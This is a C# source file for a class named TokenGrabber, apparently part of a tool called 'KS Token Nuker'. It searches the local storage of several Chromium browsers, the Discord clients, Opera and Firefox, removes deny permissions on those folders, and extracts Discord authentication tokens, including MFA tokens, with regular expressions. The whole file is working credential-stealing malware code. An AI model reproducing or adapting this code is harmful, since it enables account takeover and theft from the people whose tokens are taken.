using System;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text.RegularExpressions;

namespace KS_Token_Nuker
{
    class TokenGrabber
    {
        public static string GetTokens()
        {
            string[] LocalDirectories = { "Google\\Chrome", "Naver\\Naver Whale", "Microsoft\\Edge", "BraveSoftware\\Brave-Browser", "Yandex\\YandexBrowser", "Vivaldi\\" };
            string[] RoamingDirectories = { "discord", "discordptb", "discordcanary", "Opera Software\\Opera Stable" };
            string Tokens = "";
            string DBPath;
            for (int i = 0; i < LocalDirectories.Length; i++)
            {
                try
                {
                    DBPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), LocalDirectories[i], "User Data\\Default\\Local Storage\\leveldb");
                    if (Directory.Exists(DBPath))
                    {
                        RemoveProtection(DBPath);
                        DirectoryInfo DI = new DirectoryInfo(DBPath);
                        foreach (FileInfo FI in DI.GetFiles("*.ldb").Concat(DI.GetFiles("*.log"))) Tokens = Tokens + FetchTokens(FI);
                    }
                }
                catch { }
            }
            for (int i = 0; i < RoamingDirectories.Length; i++)
            {
                try
                {
                    DBPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), RoamingDirectories[i], "Local Storage\\leveldb");
                    if (Directory.Exists(DBPath))
                    {
                        RemoveProtection(DBPath);
                        DirectoryInfo DI = new DirectoryInfo(DBPath);
                        foreach (FileInfo FI in DI.GetFiles("*.ldb").Concat(DI.GetFiles("*.log"))) Tokens = Tokens + FetchTokens(FI);
                    }
                }
                catch { }
            }
            DBPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox");
            if (Directory.Exists(DBPath))
            {
                RemoveProtection(DBPath);
                string ProfilesPath = Path.Combine(DBPath, "profiles.ini");
                if (File.Exists(ProfilesPath) && Directory.Exists(Path.Combine(DBPath, "Profiles")))
                {
                    foreach (string FileLine in File.ReadAllLines(ProfilesPath))
                    {
                        if (FileLine.StartsWith("Path=") && Directory.Exists(DBPath))
                        {
                            DirectoryInfo DI = new DirectoryInfo(Path.Combine(DBPath, FileLine.Substring(5)));
                            if (DI.Exists)
                            {
                                RemoveProtection(DI.FullName);
                                DBPath = Path.Combine(DI.FullName, "webappsstore.sqlite");
                                if (File.Exists(DBPath))
                                {
                                    RemoveProtection(DBPath);
                                    Tokens = Tokens + FetchTokens(new FileInfo(DBPath));
                                }
                            }
                        }
                    }
                }
            }
            return Tokens.Trim();
        }

        private static string FetchTokens(FileInfo FI)
        {
            string FileText = new StreamReader(File.Open(FI.FullName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)).ReadToEnd();
            string Tokens = "";
            if (FileText.Contains("oken"))
            {
                foreach (Match TokenMatch in Regex.Matches(FileText, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")) Tokens = Tokens + TokenMatch.Value + "\n";
                foreach (Match TokenMatch in Regex.Matches(FileText, @"mfa\.[\w-]{84}")) Tokens = Tokens + TokenMatch.Value + "\n";
            }
            return Tokens;
        }

        private static void RemoveProtection(string DBPath)
        {
            if (Directory.Exists(DBPath))
            {
                try
                {
                    DirectorySecurity DS = Directory.GetAccessControl(DBPath);
                    FileSystemAccessRule FSAR = new FileSystemAccessRule(Environment.UserName, FileSystemRights.FullControl, AccessControlType.Deny);
                    DS.RemoveAccessRule(FSAR);
                    Directory.SetAccessControl(DBPath, DS);
                }
                catch { }
            }
        }
    }
}